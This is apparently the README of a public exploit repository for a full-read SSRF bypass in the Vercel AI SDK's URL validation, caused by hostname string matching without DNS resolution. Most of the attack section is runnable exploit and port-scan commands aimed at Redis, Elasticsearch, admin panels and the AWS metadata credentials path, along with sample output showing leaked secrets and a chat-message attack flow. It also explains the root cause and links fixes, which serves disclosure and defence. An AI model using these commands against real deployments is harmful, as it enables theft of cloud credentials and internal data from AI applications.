# Vercel AI SDK: Full-Read SSRF via DNS Resolution Bypass in validateDownloadUrl

**Author:** @Rat5ak | **Date:** March 2026 | **Classification:** Vulnerability Research - Public

---

## Overview

`validateDownloadUrl()` in Vercel's `@ai-sdk/provider-utils` was introduced in v4.0.19 as SSRF protection. It checks if a URL's hostname is a literal private IP or localhost string. It never resolves DNS. So if you point a domain at `127.0.0.1` and pass it through, the check sees a normal hostname and lets it fly. Then `downloadBlob()` resolves DNS, connects to localhost, and hands back the full response body.

This is not blind SSRF. The caller gets the complete response data from internal services.

```
validateDownloadUrl("http://127.0.0.1/secret")            BLOCKED
validateDownloadUrl("http://ssrf.yourdomain.com/secret")   PASSES
downloadBlob("http://ssrf.yourdomain.com/secret")          full response from localhost
```

No DNS rebinding. No custom nameserver. One A record in Cloudflare pointing to a private IP and you're done.

---

## Affected

`@ai-sdk/provider-utils` 4.0.19+ (shipped with `ai@6.0.116`)

Any application using the AI SDK that takes image/file URLs from users through `generateText()`, `streamText()`, or calls `downloadBlob()` directly. This covers most chat applications, AI agents, and anything processing multipart user messages with media URLs.

---

## Prerequisites

A domain you control with an A record pointing to a private IP:

```
ssrf.yourdomain.com  ->  A  ->  127.0.0.1
```

No NS delegation, no rebinding server, no infrastructure beyond a single DNS record.

---

## Repository Structure

```
exploit/
  poc.mjs              Main exploit. Full-read SSRF via downloadBlob()
  scan.mjs             Internal port scanner. Maps localhost services via SSRF
  mock_imds.py         Simulated AWS EC2 metadata service. Returns IAM credentials
  start-services.sh    Simulated internal services (Elasticsearch, Redis, admin panel)
  package.json         npm dependencies

docs/
  ROOT_CAUSE.md        Deep dive on why string-matching SSRF protection fails
```

---

## Usage

### Setup

```bash
git clone https://github.com/Rat5ak/Vercel-AI-SDK-SSRF-validateDownloadUrl-DNS-Bypass
cd Vercel-AI-SDK-SSRF-validateDownloadUrl-DNS-Bypass/exploit
npm install
```

### Read from internal services

```bash
node poc.mjs http://ssrf.yourdomain.com:9200/           # elasticsearch
node poc.mjs http://ssrf.yourdomain.com:6379/           # redis
node poc.mjs http://ssrf.yourdomain.com:8080/admin      # admin panels
```

For AWS metadata, point a record at `169.254.169.254`:
```bash
node poc.mjs http://meta.yourdomain.com/latest/meta-data/
```

### Scan internal ports

```bash
node scan.mjs ssrf.yourdomain.com
```

### Full demo with simulated services

```bash
# terminal 1 - start simulated internal services
bash start-services.sh

# terminal 2
node poc.mjs http://ssrf.yourdomain.com:9200/    # elasticsearch cluster data + creds
node poc.mjs http://ssrf.yourdomain.com:6379/    # redis session tokens
node poc.mjs http://ssrf.yourdomain.com:8080/    # admin panel API keys
```

### AWS credential theft demo

```bash
# terminal 1 - start mock IMDS
python3 mock_imds.py

# terminal 2
node poc.mjs http://ssrf.yourdomain.com:8888/latest/meta-data/iam/security-credentials/prod-web-role
```

---

## Example Output

```
[*] Target: http://ssrf.yourdomain.com:9200/
[*] ssrf.yourdomain.com resolves to 127.0.0.1
[+] Direct 127.0.0.1: BLOCKED by validateDownloadUrl
[+] ssrf.yourdomain.com: PASSES validation (not a literal IP)
[*] Fetching via downloadBlob()...

[!] SSRF SUCCESSFUL
[!] 142 bytes, type: application/json
[!] Response:
{
  "cluster_name": "prod-cluster",
  "status": "green",
  "nodes": 3,
  "secrets": {
    "aws_key": "AKIAIOSFODNN7EXAMPLE",
    "db_pass": "super_secret_prod_password"
  }
}
```

### Port Scanner

```
Scanning ssrf.yourdomain.com via AI SDK downloadBlob()

  :80    ERROR    68ms   connection refused
  :3000  OPEN     1937ms 9020 bytes  text/html
  :6379  OPEN     28ms   88 bytes    text/plain
  :8080  OPEN     495ms  97 bytes    text/html
  :9200  OPEN     26ms   142 bytes   application/json
  :3306  CLOSED   543ms
  :5432  CLOSED   27ms
```

---

## Root Cause

`packages/provider-utils/src/validate-download-url.ts`:

```typescript
const hostname = parsed.hostname;

// only checks strings. never calls dns.lookup()
if (hostname === 'localhost' || hostname.endsWith('.local')) throw ...
if (isIPv4(hostname) && isPrivateIPv4(hostname)) throw ...

// "ssrf.yourdomain.com" is not "localhost" and is not an IPv4 literal
// passes every check. fetch() resolves DNS and connects to 127.0.0.1
```

String matching is not network security. Full analysis in [docs/ROOT_CAUSE.md](docs/ROOT_CAUSE.md).

---

## Attack Flow

```
attacker sends chat message:
  { type: 'image', image: 'http://ssrf.attacker.com:9200/' }

app calls generateText({ messages })
  -> convertToLanguageModelPrompt()
  -> downloadAssets()
  -> download()
  -> validateDownloadUrl("http://ssrf.attacker.com:9200/")
     hostname is "ssrf.attacker.com"
     not "localhost", not a literal IPv4
     PASSES

  -> fetch("http://ssrf.attacker.com:9200/")
     DNS resolves to 127.0.0.1
     connects to localhost:9200
     reads full elasticsearch response

  -> response data sent to AI model as "image"
     model may describe the JSON in its response
     internal data leaked to attacker through chat
```

---

## Same Bug Elsewhere

This exact pattern (string-matching hostnames instead of resolving DNS) has been found in:

| Project | Advisory | Year |
|---------|----------|------|
| pydantic-ai | [GHSA-2jrp-274c-jhv3](https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3) | 2025 |
| mindsdb | [GHSA-4jcv-vp96-94xr](https://github.com/mindsdb/mindsdb/security/advisories/GHSA-4jcv-vp96-94xr) | 2024 |
| esm.sh | [GHSA-p2v6-84h2-5x4r](https://github.com/esm-dev/esm.sh/security/advisories/GHSA-p2v6-84h2-5x4r) | 2024 |
| vLLM | [CVE-2026-24779](https://dailycve.com/vllm-ssrf-bypass-cve-2026-24779-high/) | 2026 |
| Vercel AI SDK | [#13510](https://github.com/vercel/ai/issues/13510) | 2026 |

---

## References

- [GitHub Issue #13510](https://github.com/vercel/ai/issues/13510)
- [Fix PR #13512](https://github.com/vercel/ai/pull/13512)
- [Fix PR #13718](https://github.com/vercel/ai/pull/13718)
- [validateDownloadUrl source](https://github.com/vercel/ai/blob/main/packages/provider-utils/src/validate-download-url.ts)
- [downloadBlob source](https://github.com/vercel/ai/blob/main/packages/provider-utils/src/download-blob.ts)

---

## Disclaimer

For authorized security testing and research only. Dont use this on systems you dont own or have written permission to test.
